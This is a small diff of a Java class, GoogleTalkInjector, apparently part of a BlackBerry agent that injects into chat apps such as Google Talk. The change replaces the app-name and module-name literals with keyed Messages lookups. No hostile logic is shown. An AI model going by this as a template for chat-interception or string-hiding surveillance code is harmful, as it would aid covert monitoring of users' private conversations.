@@ -9,6 +9,7 @@
 
 package blackberry.injection.injectors;
 
+import blackberry.Messages;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.injectors.group.ChatGroupInjector;
@@ -16,16 +17,18 @@ import blackberry.injection.injectors.group.ChatGroupInjector;
 public class GoogleTalkInjector extends ChatGroupInjector {
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("GTalkInjector", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("GTalkInjector", DebugLevel.VERBOSE); //$NON-NLS-1$
 
     //#endif
 
     public String getAppName() {
-        return "Google Talk";
+        // G.1=Google Talk
+        return Messages.getString("G.1"); //$NON-NLS-1$
     }
 
     public String getCodName() {
-        return "net_rim_bb_qm_google";
+        //  G.2=net_rim_bb_qm_google
+        return Messages.getString("G.2"); //$NON-NLS-1$
     }
 
 }
